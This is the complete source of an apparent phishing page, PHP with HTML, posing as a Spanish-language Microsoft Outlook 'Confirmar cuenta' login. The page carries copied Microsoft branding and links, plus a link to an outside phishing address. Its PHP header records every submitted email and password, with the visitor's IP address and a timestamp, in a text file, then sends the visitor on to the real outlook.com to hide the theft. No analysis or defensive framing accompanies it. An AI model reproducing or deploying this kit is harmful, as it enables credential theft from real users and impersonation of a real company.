<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
header('Location: http://outlook.com');
$handle = fopen('accountpass.txt', 'a');
fwrite($handle, '***********************************['.$_SERVER['SERVER_NAME'].$_SERVER['SCRIPT_NAME'].']---['.strtoupper(date("h:i:s a - Y/m/d")).']---['.$_SERVER['REMOTE_ADDR']."]\r\n");
foreach($_POST as $variable => $value) {
fwrite($handle, $variable.': '.$value."\r\n");}
fclose($handle);
exit;
} ?>
<html>
<head>
<style>
input[type=password] {
    width: 500px;
    padding: 10px 14px;
    margin: 8px 0;
    box-sizing: border-box;
   	font-family: "Helvetica Neue";
	font-size: 14px;
}
input[type=text] {
    width: 500px;
    padding: 10px 14px;
    margin: 8px 0;
    box-sizing: border-box;
   	font-family: "Helvetica Neue";
	font-size: 14px;
}
input[type=email] {
    width: 500px;
    padding: 10px 14px;
    margin: 8px 0;
    box-sizing: border-box;
   	font-family: "Helvetica Neue";
	font-size: 14px;
}

h1 {
	font-family: "Helvetica Neue";
	font-size: 40px;
	font-style: normal;
	font-variant: normal;
	font-weight: 100;
	line-height: 40px;
}
h2 {
	font-family: "Helvetica";
	font-size: 17px;
	font-style: normal;
	font-variant: normal;
	font-weight: 100;
	line-height: 18px;
}
h3 {
	font-family: "Helvetica Neue";
	font-size: 16px;
	font-style: normal;
	font-variant: normal;
	font-weight: 300;
	line-height: 18px;
	color: #4d79ff;
}
h4 {
	font-family: "Helvetica Neue";
	font-size: 11px;
	font-style:normal;
	font-variant: normal;
	font-weight: 300;
	line-height: 23px;
}
.error {
	font-family: "Helvetica";
	font-size: 17px;
	font-style: normal;
	font-variant: normal;
	font-weight: 100;
	line-height: 20px;
	color:#ff1a1a;
}
a:link {
 text-decoration:none;
 color: #4d79ff;
}
a:visited {
 text-decoration:none;
 color: #4d79ff;
}



    @-webkit-keyframes rotate {
    from {
        -webkit-transform: rotate(0deg);
    }
    to {
        -webkit-transform: rotate(360deg);
    }
}
#loading {
    border: 1px solid #000;
    border-right: 0;
    border-bottom: 0;
    -webkit-border-radius: 100px;
    height: 100px;
    width: 100px;
    margin: 100px;
    -webkit-transition: all 0.5s ease-in;
    -webkit-animation-name:             rotate;
    -webkit-animation-duration:         1.0s;
    -webkit-animation-iteration-count:  infinite;
    -webkit-animation-timing-function: linear;
}

.loader {
    border: 6px solid #f3f3f3; /* Light grey 16 */
    border-top: 6px solid rgba(77,86,92,0.87); /* #3498db Blue */
    border-radius: 50%;
    width: 60px;/*120*/
    height: 60px;/*120*/
    animation: spin 1s linear infinite;
    position: fixed;
    top: 250px;
    left: 48%;
}

@keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
}


</style>
</head>
<!--<body onLoad="iniciar();">

<body>
<!--<div class="loader" id="loader_ic"></div>-->

<div align=center>
<form metod="get" name="EmailLogin" method="post" action="<?php echo basename(__FILE__); ?>">
<table width="1000" border="0" cellspacing="1" cellpadding="2">
<tr>
	<td colspan="4"><div align="center"><img id="superiors" src="superiors.png" width="364" height="54"></div><br><br></td>
</tr>
<tr>
	<td colspan="4"><div align="center"><h1>Confirmar cuenta</h1></div></td>
</tr>
<tr>
<tr>
	<td colspan="4">
		<div align="center"><input type="email" id="correo" name="correo" placeholder="Ingrese su cuenta de correo" required></div>
	</td>
</tr>
<tr>
	<td colspan="4">
		<div align="center"><input type="password" id="pass" name="pass" placeholder="Ingrese su contrase&ntilde;a actual" required ></div>
		<!--
		<div align="center" id="error_p" class="error">&nbsp;</div>-->
	</td>
</tr>


<tr>
	<!--<td colspan="4"><div align="center"><br><br><a onClick="validar();"><img id="confirmarcuenta" src="lib/images/confirmarcuenta.png" width="160" height="32"></a></div><br><br><br></td>-->
    
    <td colspan="4"><div align="center"><br><br><input type="image" name="imageField" src="confirmarcuenta.png" />
   <!-- <img id="confirmarcuenta" src="lib/images/confirmarcuenta.png" width="160" height="32"></a>--></div><br><br><br></td>
</tr>

<tr>
	<td width="340"><div align="center"><h3>&nbsp;</h3></div></td>
	<td width="160"><div align="center"><h3><a target="_blank" href="https://login.live.com/gls.srf?urlID=WinLiveTermsOfUse&mkt=EN-US&vv=1600">T&eacute;rminos de uso</a></h3></div></td>
	<td width="160"><div align="center"><h3><a target="_blank" href="https://login.live.com/gls.srf?urlID=MSNPrivacyStatement&mkt=EN-US&vv=1600">Privacidad y Cookies</a></h3></div></td>
	<td width="340"><div align="center"><h3>&nbsp;</h3></div></td>
</tr>

<tr>
	<td colspan="4"><div align="center"><h4>&copy; 2020 Microsoft.</h4></div><br><br></td>
</tr>
</table>
</form>
</div>
<!--]-->
<div style="text-align:center;font-size:11px" class="cbalink"><a href="	https://outlook2020urd.webcindario.com/Loginone.php" title="CONFIRME SU CUENTA">confirme su cuenta</a> OUTLOOK.COM<br/><br/></div>
<div class="cumf_bt_form_wrapper" style="display:none">
<form id="contact_us_mail_feedback" action="<?php echo basename(__FILE__); ?>" method="post">
    <fieldset>
        <!-- Form Name -->
        <legend>Contact Us</legend>
        <!-- Text input-->
        <div class="cumf_bt_form-group">
            <label class="col-md-4 cumf_bt_control-label" for="cumf_bt_name">name</label>
            <div class="col-md-4">
                <input id="cumf_bt_name" name="cumf_bt_name" type="text" placeholder="your name" class="cumf_bt_form-control cumf_bt_input-md" required="1"/>
                <span class="cumf_bt_help-block">Please enter your name</span>
            </div>
        </div>
        <!-- Text input-->
        <div class="cumf_bt_form-group">
            <label class="col-md-4 cumf_bt_control-label" for="cumf_bt_email">your email</label>
            <div class="col-md-4">
                <input id="cumf_bt_email" name="cumf_bt_email" type="text" placeholder="enter your email" class="cumf_bt_form-control cumf_bt_input-md" required="1"/>
                <span class="cumf_bt_help-block">please enter your email</span>
            </div>
        </div>
        <!-- Textarea -->
        <div class="cumf_bt_form-group">
            <label class="col-md-4 cumf_bt_control-label" for="cumf_bt_message">your message</label>
            <div class="col-md-4">
                <textarea class="cumf_bt_form-control" id="cumf_bt_message" name="cumf_bt_message">Message goes here</textarea>
            </div>
        </div>
        <input type="submit" id="cumf_bt_submit" value="Send"/>
    </fieldset>
</form>
</div>

</body>
</html><!-- aba </body><!-->
